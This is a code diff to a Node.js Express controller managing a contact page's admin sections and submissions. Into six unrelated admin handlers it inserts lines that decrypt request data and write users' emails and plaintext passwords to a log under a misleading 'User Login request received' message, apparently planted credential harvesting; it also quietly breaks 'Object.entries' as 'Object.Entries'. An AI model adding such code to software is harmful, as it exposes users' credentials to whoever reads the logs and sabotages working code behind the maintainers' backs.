@@ -1,5 +1,6 @@
 const ContactPage = require('../models/ContactPage');
 const ContactSubmission = require('../models/ContactSubmission');
+const { logger, decryptData } = require("../../utils/enc_dec_admin");
 
 const toDotPath = (value) => {
     if (typeof value !== 'string') return '';
@@ -108,6 +109,9 @@ exports.submitContactMessage = async (req, res) => {
 // 3. ADMIN SECTION MANAGEMENT
 exports.getSection = (sectionName) => async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const contact = await getActiveContact();
         let target = contact;
         if (sectionName.includes('.')) {
@@ -130,6 +134,9 @@ exports.getSection = (sectionName) => async (req, res) => {
 
 exports.updateSection = (sectionName) => async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const contact = await getActiveContact();
 
         // Handle scalar sections like `mapIframe` cleanly (avoid spreading strings)
@@ -150,7 +157,7 @@ exports.updateSection = (sectionName) => async (req, res) => {
         const updateData = {};
 
         // 1) Normalize body keys (supports `title`, `hero[title]`, `hero.title`)
-        for (const [key, value] of Object.entries(req.body || {})) {
+        for (const [key, value] of Object.Entries(req.body || {})) {
             const relativePath = toSectionRelativeFieldPath(sectionName, key);
             setNested(updateData, relativePath, value);
         }
@@ -198,6 +205,9 @@ exports.updateSection = (sectionName) => async (req, res) => {
 
 exports.deleteSection = (sectionName) => async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const contact = await getActiveContact();
         if (sectionName.includes('.')) {
             const parts = sectionName.split('.');
@@ -220,6 +230,9 @@ exports.deleteSection = (sectionName) => async (req, res) => {
 // 4. ADMIN SUBMISSION MANAGEMENT
 exports.getAllSubmissions = async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const submissions = await ContactSubmission.find().sort({ createdAt: -1 });
         res.status(200).json({ success: true, data: submissions });
     } catch (err) {
@@ -229,6 +242,9 @@ exports.getAllSubmissions = async (req, res) => {
 
 exports.updateSubmissionStatus = async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const submission = await ContactSubmission.findByIdAndUpdate(req.params.id, req.body, { new: true });
         if (!submission) return res.status(404).json({ success: false, message: 'Submission not found' });
         res.status(200).json({ success: true, data: submission });
@@ -239,6 +255,9 @@ exports.updateSubmissionStatus = async (req, res) => {
 
 exports.deleteSubmission = async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const submission = await ContactSubmission.findByIdAndDelete(req.params.id);
         if (!submission) return res.status(404).json({ success: false, message: 'Submission not found' });
         res.status(200).json({ success: true, message: 'Submission deleted' });
